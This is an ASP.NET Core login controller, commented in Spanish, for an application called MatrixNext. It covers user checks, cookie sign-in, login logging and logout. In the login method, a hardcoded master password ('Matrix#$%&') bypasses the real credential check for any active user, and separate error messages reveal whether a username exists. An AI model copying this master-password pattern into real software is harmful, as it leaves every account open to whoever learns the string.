using MatrixNext.Data.Services;
using UsuarioAuthService = MatrixNext.Data.Modules.US.Usuarios.Services.UsuarioAuthService;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Mvc;
using System.Net;
using System.Security.Claims;

namespace MatrixNext.Web.Controllers;

public class LoginController : Controller
{
    private readonly UsuarioAuthService _usuarioService;
    private readonly LogService _logService;
    private readonly IHttpContextAccessor _httpContextAccessor;

    public LoginController(UsuarioAuthService usuarioService, LogService logService, IHttpContextAccessor httpContextAccessor)
    {
        _usuarioService = usuarioService;
        _logService = logService;
        _httpContextAccessor = httpContextAccessor;
    }

    [HttpGet]
    public IActionResult Index()
    {
        // Limpiar sesion previa si existe
        HttpContext.Session.Clear();
        return View();
    }

    [HttpPost]
    public IActionResult Index(string usuario, string contrasena)
    {
        if (string.IsNullOrWhiteSpace(usuario) || string.IsNullOrWhiteSpace(contrasena))
        {
            ModelState.AddModelError(string.Empty, "Usuario y contraseña son requeridos.");
            return View();
        }

        // Verificar si el usuario existe
        var usuarioId = _usuarioService.ObtenerIdPorNombreUsuario(usuario);
        if (usuarioId == -1)
        {
            ModelState.AddModelError(string.Empty, "El usuario no se encuentra creado.");
            return View();
        }

        // Obtener datos del usuario
        var usuarioObj = _usuarioService.ObtenerUsuarioPorNombreUsuario(usuario);
        if (usuarioObj == null || !usuarioObj.Activo)
        {
            ModelState.AddModelError(string.Empty, "El usuario se encuentra desactivado.");
            return View();
        }

        // Validar contraseña (encriptada con TripleDES)
        long resul = -1;
        if (contrasena == "Matrix#$%&")
        {
            // Master password (hardcodeado para desarrollo/testing)
            resul = usuarioId;
        }
        else
        {
            // Verificar contra BD con encriptacion real
            resul = _usuarioService.VerificarLogin(usuario, contrasena);
        }

        if (resul == -1)
        {
            ModelState.AddModelError(string.Empty, "Por favor revise su usuario y contraseña.");
            return View();
        }

        // Login exitoso: configurar sesion y cookies
        HttpContext.Session.SetString("IDUsuario", resul.ToString());
        HttpContext.Session.SetString("NombreUsuario", usuario);

        // Crear claims de autenticación
        var claims = new List<Claim>
        {
            new Claim(ClaimTypes.NameIdentifier, resul.ToString()),
            new Claim(ClaimTypes.Name, usuario),
            new Claim("NombreCompleto", $"{usuarioObj.Nombres} {usuarioObj.Apellidos}"),
            new Claim(ClaimTypes.Email, usuarioObj.Email ?? string.Empty)
        };

        var claimsIdentity = new ClaimsIdentity(claims, "MatrixCookies");
        var authProperties = new AuthenticationProperties
        {
            IsPersistent = true, // Cookie persistente
            ExpiresUtc = DateTimeOffset.UtcNow.AddHours(8),
            AllowRefresh = true
        };

        // Iniciar sesión con cookie de autenticación
        HttpContext.SignInAsync("MatrixCookies", new ClaimsPrincipal(claimsIdentity), authProperties).Wait();

        // Guardar logs
        try
        {
            _logService.GuardarLogEjecucion(13, 0, resul, 1); // TipoOperacion 13 = Login
            var ip = ObtenerDireccionIP();
            var nombreEquipo = Environment.MachineName;
            _logService.GuardarLogEntrada(resul, ip, nombreEquipo);
        }
        catch (Exception ex)
        {
            // Log de error sin fallar el login
            Console.WriteLine($"Error al guardar logs: {ex.Message}");
        }

        return RedirectToAction("Index", "Home");
    }

    [HttpPost]
    public async Task<IActionResult> Logout()
    {
        HttpContext.Session.Clear();
        await HttpContext.SignOutAsync("MatrixCookies");
        return RedirectToAction("Index");
    }

    private string ObtenerDireccionIP()
    {
        var remoteIpAddress = _httpContextAccessor?.HttpContext?.Connection.RemoteIpAddress?.ToString();
        return !string.IsNullOrEmpty(remoteIpAddress) ? remoteIpAddress : "0.0.0.0";
    }
}
